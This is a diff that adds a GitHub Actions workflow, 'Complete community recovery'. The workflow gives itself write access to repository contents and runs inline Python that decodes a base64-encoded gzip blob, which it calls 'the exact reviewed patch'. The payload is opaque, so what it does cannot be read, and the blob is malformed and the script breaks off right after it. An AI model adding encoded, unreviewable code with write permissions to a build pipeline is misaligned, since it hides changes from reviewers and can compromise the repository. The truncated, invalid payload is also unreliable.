@@ -1,0 +1,32 @@
+name: Complete community recovery
+
+on:
+  push:
+    branches: [main]
+    paths: ['.github/workflows/complete-community-recovery.yml']
+
+permissions:
+  contents: read
+
+jobs:
+  verify-patch:
+    runs-on: ubuntu-24.04
+    timeout-minutes: 20
+    permissions:
+      contents: write
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          persist-credentials: false
+      - uses: actions/setup-python@v5
+        with:
+          python-version: '3.12'
+      - uses: actions/setup-node@v4
+        with:
+          node-version: '24'
+      - name: Apply the exact reviewed patch without overwriting concurrent edits
+        run: |
+          python3 - <<'PY'
+          import base64,gzip,hashlib,json,pathlib,subprocess
+          encoded='H4sIAAAAAAAC/+08a3OcSJJ/pU7+QLcF9Pslb2+MLMkzuvXYPkne2w1ZgWko1IxoYIGW3OPwf7/MrAfQjWRJ47nYiziPxw1FVVZWZlZWvuDr3oIHScb3DtjXvbOTw+NfT+yVD3d7E3foTbp+MAtm/aHru+ORv5jOJq4/6o6ng8Adj3v+bOYO+4OZO/VGg1Ew45OBPxrN+Mgfj/ieyfbymzCK8o6XrFbrOCw2VuTGfhhfW6l7za3FOox8nnVyLwvTArotuXfjXLsFz+10gzjMhoPBYtpdDGddrzccjvygv/BnbtAdu/3RrD/q+V3PHc6mM8+d9HoTvlgEM3cy8qZ8OJiNuqOn45B7bhAkke+kWfIb9wqJSOD2RsHA63UXPXc0W7hwzxfd0QCuZkNY7NQdjCeLYDHqBkF32B+548m42x+4Lgca9afu0xGhe8dzCzdKrtdc4uHPRsF0xruzgdvn3iwAug9Go6nnut3Z0J8ueH8AWAynQ97vuoMZ51Nv6HY93xsuZm5/0H0GU5J040ThInOzjULC58Npr+sPu74/nI5hydwN+v3JxJ94M98bDflg4E3cEe/2ht60x0f9IBj6vfFi4fWmI3fwdCSydVyEK+54SVzwL5Ip8TqKnrGcuMiSyMn4bcjv5IJ4F6TMmwT9Lu/67rDn8QnnwXQwmk551xuPJ57bDyajMWyA/pT4PByNebcPG8OfTIfe0xd0l2Q3QZTcObCymGda3LvDxbAfHCxfTIfeh?'
+          PY
